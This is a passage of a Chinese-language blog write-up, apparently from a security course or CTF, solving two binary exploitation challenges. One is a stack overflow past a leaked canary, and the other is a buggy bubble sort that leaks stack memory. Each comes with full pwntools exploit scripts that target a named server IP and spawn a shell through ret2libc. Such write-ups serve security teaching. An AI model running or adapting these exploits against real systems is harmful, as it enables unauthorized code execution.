+<h3 id="u89E3_u984C_u601D_u8DEF-5"><a href="#u89E3_u984C_u601D_u8DEF-5" class="headerlink" title="解題思路"></a>解題思路</h3><p>首先，這題有開StackGuard，所以單純buffer overflow會被偵測，必須想辦法先知道canary的值，然後去做buffer overflow就能避開canary修改偵測(還原canary)<br>具體實現是先塞128字元的垃圾進去，他會把\x00前的東⻄印出來，包括buf[136]前的東西，也就是canary!<br>所以我們就有辦法控制 return address而不被StackGuard偵測，再來因為有DEP，我們一樣要用到PLT/GOT，先想辦法leak GOT裡面的某個函數位址 (這裏我leak puts())，然後算出base address，就能像上題那樣直接call system(“/bin/sh”)。要leak puts的GOT內容，可以把main return address蓋成puts的PLT，然後參數放GOT位址去leak memory 內容。<br>整個stack分佈大概是⻑這樣:<br>padding + canary + padding + puts@plt + main_address + puts@got</p>
+<p>這樣就可以用 base + offset = address來求base<br>要再call main的原因是因為我leak出來之後還要再接著call system，所以就讓程式再跑⼀次，重新做⼀次overflow，把return address蓋成system()位址</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">r = remote(<span class="string">'140.115.53.13'</span>, <span class="number">11005</span>)</div><div class="line">r.recvuntil(<span class="string">"Input :"</span>)</div><div class="line">r.send(<span class="string">"A"</span>*<span class="number">128</span> + <span class="string">"\n"</span>)</div><div class="line">a = r.recvuntil(<span class="string">"Input :"</span>)</div><div class="line">puts_plt = <span class="number">0x08048470</span></div><div class="line">puts_got = <span class="number">0x804a020</span></div><div class="line">main = <span class="number">0x080485bd</span></div><div class="line">gets_off = <span class="number">0x642b0</span></div><div class="line">puts_off = <span class="number">0x64c10</span></div><div class="line">system_off = <span class="number">0x3fcd0</span></div><div class="line">sh_off = <span class="number">0x15da84</span></div><div class="line">r.send(<span class="string">"exit"</span> + <span class="string">"A"</span>*<span class="number">124</span> + <span class="string">"\x00"</span> + a[<span class="number">136</span>:<span class="number">139</span>] + <span class="string">"A"</span>*<span class="number">12</span> + p32(puts_plt) + p32(main) + p32(puts_got) + <span class="string">"\n"</span>)</div><div class="line"><span class="keyword">print</span> r.recvline()</div><div class="line">tmp = r.recvline()</div><div class="line"><span class="keyword">print</span> enhex(tmp)</div><div class="line">base = u32(tmp[<span class="number">0</span>:<span class="number">4</span>]) - puts_off</div><div class="line"><span class="keyword">print</span> <span class="string">"Base = "</span>, hex(base)</div><div class="line">gets = base + gets_off</div><div class="line">system = base + system_off</div><div class="line"><span class="keyword">print</span> <span class="string">"main = "</span>, hex(main)</div><div class="line"><span class="keyword">print</span> <span class="string">"system = "</span>, hex(system)</div><div class="line">r.send(<span class="string">"exit"</span> + <span class="string">"A"</span>*<span class="number">124</span> + <span class="string">"\x00"</span> + a[<span class="number">136</span>:<span class="number">139</span>] + <span class="string">"A"</span>*<span class="number">5</span> + <span class="string">"\x85\x04\x08"</span> + p32(system) + p32(puts_got) + p32(sh_off+base) + <span class="string">"\n"</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<h2 id="u7B2C_u4E03_u984C_3ABubble_sort__5Bpwn_5D"><a href="#u7B2C_u4E03_u984C_3ABubble_sort__5Bpwn_5D" class="headerlink" title="第七題:Bubble sort [pwn]"></a>第七題:Bubble sort [pwn]</h2><h3 id="u984C_u76EE-6"><a href="#u984C_u76EE-6" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> n,i,j ;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> tmp ;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> buf[<span class="number">8</span>];</div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line">		<span class="built_in">puts</span>(<span class="string">"How many numbers do you have ?"</span>);</div><div class="line">		fflush(<span class="built_in">stdout</span>);</div><div class="line">		<span class="built_in">scanf</span>(<span class="string">"%u"</span>,&amp;n);</div><div class="line">		<span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; n ; i++)&#123;</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"Enter the %d number : "</span>,i);</div><div class="line">			fflush(<span class="built_in">stdout</span>);</div><div class="line">			<span class="built_in">scanf</span>(<span class="string">"%u"</span>,&amp;buf[i]);</div><div class="line">		&#125;</div><div class="line">		<span class="built_in">puts</span>(<span class="string">"Processing......"</span>);</div><div class="line">		fflush(<span class="built_in">stdout</span>);</div><div class="line">		sleep(<span class="number">1</span>);</div><div class="line">		<span class="keyword">for</span>(i = n ; i &gt; <span class="number">0</span> ; i--)&#123;</div><div class="line">			<span class="keyword">for</span>( j = <span class="number">0</span> ; j &lt; i ; j++)&#123;</div><div class="line">				<span class="keyword">if</span>(buf[j] &gt; buf[j+<span class="number">1</span>])&#123;</div><div class="line">					tmp = buf[j] ;</div><div class="line">					buf[j] = buf[j+<span class="number">1</span>];</div><div class="line">					buf[j+<span class="number">1</span>] = tmp ;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="built_in">puts</span>(<span class="string">"Result :"</span>);</div><div class="line">		fflush(<span class="built_in">stdout</span>);</div><div class="line">		<span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; n ; i++)&#123;</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"%u "</span>,buf[i]);</div><div class="line">		&#125;</div><div class="line">		<span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">		<span class="built_in">puts</span>(<span class="string">"Continue (yes:1,no:0) ?"</span>);</div><div class="line">		fflush(<span class="built_in">stdout</span>);</div><div class="line">		<span class="built_in">scanf</span>(<span class="string">"%u"</span>,&amp;tmp);</div><div class="line">		<span class="keyword">if</span>(tmp != <span class="number">1</span>)&#123;</div><div class="line">			<span class="built_in">puts</span>(<span class="string">"Thank you ~"</span>);</div><div class="line">			fflush(<span class="built_in">stdout</span>);</div><div class="line">			<span class="keyword">break</span> ;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="u89E3_u984C_u601D_u8DEF-6"><a href="#u89E3_u984C_u601D_u8DEF-6" class="headerlink" title="解題思路"></a>解題思路</h3><p>首先，這題有DEP、StackGuard<br>這題看似單純的bubble sort，實際上交換的部分有bug<br>他有可能拿buf以外的值來做判斷、交換<br>所以只要塞小一點的值，就可以把後面想leak的memory內容排序到前面<br>然後我們要做的就是去Leak canary和main return address<br>⽤gdb動態分析⼀下就能找出canary和main return address的位址在stack中的位置，再來就是構造出能夠讓canary和return address被排到前面的序列，首先我們需要夠⼤的數字(要⼤於我們想leak的內容)，這裏我是塞-1</p>
+<p>第一輪先塞8個-1，則canary值會因為⼩於-1(約4294967295)，排序到最前面，故可取得canary值<br>第二輪塞16個9999999900，return address因為⼩於9999999900，被排序到最前面<br>第三輪塞20個9999999999 防止排序搗亂我們<br>第四輪塞17個0,再塞2個/bin/sh位址 (其實只需塞最後一個即可，但為了防止排序搗亂所以塞兩個)<br>最後一輪塞8個0、3個canary、6個system位址，即可拿到shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">remote r = remote(<span class="string">'140.115.53.13'</span>, <span class="number">31337</span>)</div><div class="line"></div><div class="line"><span class="comment"># STEP 1</span></div><div class="line">r.send(<span class="string">"8\n"</span> + <span class="string">"-1\n"</span>*<span class="number">8</span>)</div><div class="line">r.recvline()</div><div class="line">r.recvline()</div><div class="line">r.recvline()</div><div class="line">str = r.recvline()</div><div class="line">canary = (str[:<span class="number">10</span>])</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"*"</span>*<span class="number">10</span></div><div class="line"><span class="keyword">print</span> <span class="string">"canary = "</span>, canary</div><div class="line"><span class="keyword">print</span> <span class="string">"*"</span>*<span class="number">10</span></div><div class="line"></div><div class="line">r.send(<span class="string">"1\n"</span>)</div><div class="line"></div><div class="line"><span class="comment"># STEP 2</span></div><div class="line">r.recvuntil(<span class="string">'How many numbers do you have ?'</span>)</div><div class="line">r.send(<span class="string">"16\n"</span> + <span class="string">"9999999900\n"</span> * <span class="number">16</span>)</div><div class="line">r.recvline()</div><div class="line">r.recvline()</div><div class="line">r.recvline()</div><div class="line">str = r.recvline()</div><div class="line">ret = str[:<span class="number">10</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">"*"</span>*<span class="number">10</span></div><div class="line"><span class="keyword">print</span> <span class="string">"ret = "</span>, ret</div><div class="line"><span class="keyword">print</span> <span class="string">"*"</span>*<span class="number">10</span></div><div class="line">r.send(<span class="string">"1\n"</span>)</div><div class="line"></div><div class="line"><span class="comment"># STEP 3</span></div><div class="line">r.recvuntil(<span class="string">'How many numbers do you have ?'</span>)</div><div class="line">r.send(<span class="string">"20\n"</span> + <span class="string">"9999999999\n"</span> * <span class="number">20</span>)</div><div class="line">r.recvline()</div><div class="line">r.recvline()</div><div class="line">r.recvline()</div><div class="line">str = r.recvline()</div><div class="line">r.send(<span class="string">"1\n"</span>)</div><div class="line"></div><div class="line"><span class="comment"># Address</span></div><div class="line">base = int(ret) - <span class="number">0x19a63</span></div><div class="line">sh = (base + <span class="number">0x15da84</span>).__str__()</div><div class="line">system = (base + <span class="number">0x3fcd0</span>).__str__()</div><div class="line"><span class="keyword">print</span> <span class="string">"base = "</span>, base</div><div class="line"><span class="keyword">print</span> <span class="string">"sh = "</span>, sh</div><div class="line"><span class="keyword">print</span> <span class="string">"systen = "</span>, system</div><div class="line"></div><div class="line"><span class="comment"># STEP 4</span></div><div class="line">r.recvuntil(<span class="string">'How many numbers do you have ?'</span>)</div><div class="line">r.send(<span class="string">"19\n"</span> + <span class="string">"0\n"</span> * <span class="number">17</span> + (sh + <span class="string">"\n"</span>) * <span class="number">2</span>)</div><div class="line">r.recvline()</div><div class="line">r.recvline()</div><div class="line">r.recvline()</div><div class="line">str = r.recvline()</div><div class="line">r.send(<span class="string">"1\n"</span>)</div><div class="line"></div><div class="line"><span class="comment"># STEP 5</span></div><div class="line">r.recvuntil(<span class="string">'How many numbers do you have ?'</span>)</div><div class="line">r.send(<span class="string">"17\n"</span> + <span class="string">"0\n"</span> * <span class="number">8</span> + (canary + <span class="string">"\n"</span>) * <span class="number">3</span> + (system + <span class="string">"\n"</span>) * <span class="number">6</span>)</div><div class="line">r.recvline()</div><div class="line">r.recvline()</div><div class="line">r.recvline()</div><div class="line">str = r.recvline()</div><div class="line">r.send(<span class="string">"0\n"</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/01/18/project2/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          攻防Project2 - LD_PRELOAD實作library rootkit
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">Share to: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+    <a class="jiathis_button_twitter"></a>
+    <a class="jiathis_button_plus"></a> 
+    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+
+
+<section id="comments">
+  <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'kaibrosblog'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2022 KaiBro
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.1.6/require.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-61797645-2', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+  </div>
+</body>
+</html>
